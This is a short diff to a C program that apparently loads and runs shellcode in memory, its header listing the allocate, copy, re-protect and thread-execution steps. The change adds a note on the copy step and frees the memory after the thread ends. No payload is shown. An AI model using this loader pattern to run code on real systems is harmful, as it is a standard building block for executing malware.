@@ -9,6 +9,7 @@ Compile:
 
 Technique:
     - allocation: VirtualAlloc
+    - writing:    RtlMoveMemory
     - permission: VirtualProtect
     - execution:  CreateThread
 */
@@ -41,6 +42,9 @@ int main ()
         h_thread = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
         WaitForSingleObject (h_thread, -1);
     }
+
+    // deallocate
+    VirtualFree (runtime, payload_len, MEM_RELEASE);
 
     return 0;
 }
